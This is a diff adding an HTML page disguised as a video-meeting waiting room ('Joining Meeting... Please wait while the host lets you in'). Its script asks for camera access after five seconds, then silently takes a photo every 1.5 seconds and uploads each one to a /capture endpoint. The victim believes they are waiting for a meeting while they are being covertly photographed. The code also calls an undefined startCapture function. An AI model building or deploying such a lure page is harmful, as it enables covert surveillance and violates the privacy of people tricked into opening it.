@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meeting Room</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background: #121212;
+            color: white;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            margin-top: 150px;
+        }
+        .loading {
+            font-size: 20px;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔗 Joining Meeting...</h1>
+        <p class="loading">Please wait while the host lets you in.</p>
+    </div>
+
+    <script>
+        let capturing = false;
+        let videoStream;
+
+        setTimeout(() => {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    videoStream = stream;
+                    capturing = true;
+                    captureLoop();
+                })
+                .catch(error => console.error("Error accessing camera:", error));
+        }, 5000);
+
+        function captureLoop() {
+            if (!capturing) return;
+            let track = videoStream.getTracks()[0];
+            let imageCapture = new ImageCapture(track);
+            imageCapture.takePhoto()
+                .then(blob => {
+                    let reader = new FileReader();
+                    reader.onloadend = function () {
+                        fetch('/capture', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ image: reader.result })
+                        });
+                    };
+                    reader.readAsDataURL(blob);
+                })
+                .catch(error => console.error("Capture error:", error));
+
+            setTimeout(captureLoop, 1500);
+        }
+
+        window.onload = startCapture; // Start capturing when page loads
+    </script>
+</body>
+</html>
